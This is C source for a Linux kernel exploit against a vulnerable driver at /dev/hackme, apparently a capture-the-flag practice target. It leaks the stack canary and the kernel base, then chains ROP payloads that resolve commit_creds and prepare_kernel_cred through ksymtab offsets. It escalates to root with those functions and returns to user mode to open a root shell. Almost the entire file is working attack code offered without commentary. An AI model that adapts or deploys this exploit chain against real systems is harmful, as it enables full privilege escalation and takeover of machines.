#include <stdio.h>
#include <fcntl.h>

/*
0xffffffff81006370: pop rdi; ret;  --  [0x6370]
0xffffffff81200f10 T swapgs_restore_regs_and_return_to_usermode -- [0x200f10]
0xffffffff81004d11: pop rax; ret; [0x4d11]
0xffffffff81015a7f: mov rax, qword ptr [rax]; pop rbp; ret; [0x15a7f]
0xffffffff81f87d90 r __ksymtab_commit_creds [0xf87d90]
0xffffffff81f8d4fc r __ksymtab_prepare_kernel_cred [0xf8d4fc]
*/

//iretq RIP|CS|RFLAGS|SP|SS 
#define MAX 1
int fd;
unsigned long user_cs = MAX,user_rflags = MAX,user_sp = MAX,user_ss = MAX;

unsigned long image_base;
unsigned long commit_creds;
unsigned long prepare_kernel_cred;
unsigned long canary;

int prepare_kernel_cred_offset;
int commit_creds_offset;
unsigned long cred;


void save_state();
void backdoor();
void leak_commit_creds();
void leak_prepare_kernel_cred();
void get_cred();
void jmp_get_cred();
void jmp_leak_prepare_kernel_cred();
void jmp_get_cred();
void jmp_back_door();
void start();


void save_state()
{
	__asm(
		".intel_syntax noprefix;"
		"mov user_cs, cs;"
		"mov user_sp, rsp;"
		"mov user_ss, ss;"
		"pushf;"
		"pop user_rflags;"
		".att_syntax;"
	);
	puts("***save state***");
	printf("user_cs:0x%lx\n", user_cs);
	printf("user_sp:0x%lx\n", user_sp);
	printf("user_ss:0x%lx\n", user_ss);
	printf("user_rflags:0x%lx\n", user_rflags);
	puts("***save finish***");
}

void backdoor()
{
	puts("***getshell***");
	system("/bin/sh");
}

void start()
{
	unsigned long payload[256];
	unsigned int index = 0;
	for(int i = 0; i < (16); i ++)
		payload[index++] = 0;
	//iretq RIP|CS|RFLAGS|SP|SS
	payload[index++] = canary;
	payload[index++] = 0;
	payload[index++] = 0;
	payload[index++] = 0;
	payload[index++] = image_base +  0x4d11; //pop_rax_ret
	payload[index++] = image_base + 0xf87d90; //__ksymtab_commit_creds
	payload[index++] = image_base + 0x15a7f; // mov rax, qword ptr [rax]; pop rbp; ret;
	payload[index++] = 0;
	payload[index++] = image_base + 0x200f10 + 22; //swapgs_restore_regs_and_return_to_usermode + 22;mov    rdi,rsp;
	payload[index++] = 0;
	payload[index++] = 0;
	payload[index++] = (unsigned long)leak_commit_creds;
	payload[index++] = user_cs;
	payload[index++] = user_rflags;
	payload[index++] = user_sp;
	payload[index++] = user_ss;
	write(fd, payload, index * 8);
	
}

void leak_commit_creds()
{
	__asm(
		".intel_syntax noprefix;"
		"mov commit_creds_offset, eax;"
		".att_syntax;"
	);
	printf("commit_cred_offset:0x%x\n", commit_creds_offset);
	commit_creds = image_base + 0xf87d90 + (int)commit_creds_offset;
	printf("commit_cred:0x%lx\n", commit_creds);
	jmp_leak_prepare_kernel_cred();
}

void jmp_leak_prepare_kernel_cred()
{
	unsigned long payload[256];
	unsigned int index = 0;
	for(int i = 0; i < (16); i ++)
		payload[index++] = 0;
	//iretq RIP|CS|RFLAGS|SP|SS
	payload[index++] = canary;
	payload[index++] = 0;
	payload[index++] = 0;
	payload[index++] = 0;
	payload[index++] = image_base +  0x4d11; //pop_rax_ret
	payload[index++] = image_base + 0xf8d4fc; //__ksymtab_prepare_kernel_cred
	payload[index++] = image_base + 0x15a7f; // mov rax, qword ptr [rax]; pop rbp; ret;
	payload[index++] = 0;
	payload[index++] = image_base + 0x200f10 + 22; //swapgs_restore_regs_and_return_to_usermode + 22;mov    rdi,rsp;
	payload[index++] = 0;
	payload[index++] = 0;
	payload[index++] = (unsigned long)leak_prepare_kernel_cred;
	payload[index++] = user_cs;
	payload[index++] = user_rflags;
	payload[index++] = user_sp;
	payload[index++] = user_ss;
	write(fd, payload, index * 8);	
}


void leak_prepare_kernel_cred()
{
	__asm(
		".intel_syntax noprefix;"
		"mov prepare_kernel_cred_offset, rax;"
		".att_syntax;"
	);
	printf("prepare_kernel_cred_offset:0x%x\n", prepare_kernel_cred_offset);
	prepare_kernel_cred = image_base + 0xf8d4fc + (int)prepare_kernel_cred_offset;
	printf("prepare_kernel_cred:0x%lx\n", prepare_kernel_cred);
	printf("jmp get cred\n");
	jmp_get_cred();
}

void jmp_get_cred()
{
	unsigned long payload[256];
	unsigned int index = 0;
	for(int i = 0; i < (16); i ++)
		payload[index++] = 0;
	//iretq RIP|CS|RFLAGS|SP|SS
	payload[index++] = canary;
	payload[index++] = 0;
	payload[index++] = 0;
	payload[index++] = 0;
	payload[index++] = image_base +  0x6370; //pop_rdi_ret
	payload[index++] = 0;
	payload[index++] = prepare_kernel_cred; // prepare_kernel_cred
	payload[index++] = image_base + 0x200f10 + 22; //swapgs_restore_regs_and_return_to_usermode + 22;mov    rdi,rsp;
	payload[index++] = 0;
	payload[index++] = 0;
	payload[index++] = (unsigned long)get_cred;
	payload[index++] = user_cs;
	payload[index++] = user_rflags;
	payload[index++] = user_sp;
	payload[index++] = user_ss;
	write(fd, payload, index * 8);	
	
}


void get_cred()
{
	__asm(
		".intel_syntax noprefix;"
		"mov cred, rax;"
		".att_syntax;"
	);
	printf("cred:0x%lx\n", cred);
	jmp_back_door();
}

void jmp_back_door()
{
	unsigned long payload[256];
	unsigned int index = 0;
	for(int i = 0; i < (16); i ++)
		payload[index++] = 0;
	//iretq RIP|CS|RFLAGS|SP|SS
	payload[index++] = canary;
	payload[index++] = 0;
	payload[index++] = 0;
	payload[index++] = 0;
	payload[index++] = image_base +  0x6370; //pop_rdi_ret
	payload[index++] = cred; 		 //cred
	payload[index++] = commit_creds; // commit_creds
	payload[index++] = image_base + 0x200f10 + 22; //swapgs_restore_regs_and_return_to_usermode + 22;mov    rdi,rsp;
	payload[index++] = 0;
	payload[index++] = 0;
	payload[index++] = (unsigned long)backdoor;
	payload[index++] = user_cs;
	payload[index++] = user_rflags;
	payload[index++] = user_sp;
	payload[index++] = user_ss;
	write(fd, payload, index * 8);	
}




int main()
{
	save_state();
	fd = open("/dev/hackme", O_RDWR);
	unsigned long buf[256];
	read(fd, buf, 40 * 8);
	for(int i = 0; i < 40; i++)
		printf("i:%d\taddress:0x%lx\n",i, buf[i]);
	canary = buf[2];
	unsigned long leak_addr = buf[38];
	printf("leak addr:0x%lx\n", leak_addr);
	image_base = leak_addr - 0xa157;
	printf("ImageBase:0x%lx\n", image_base);
	start();
}
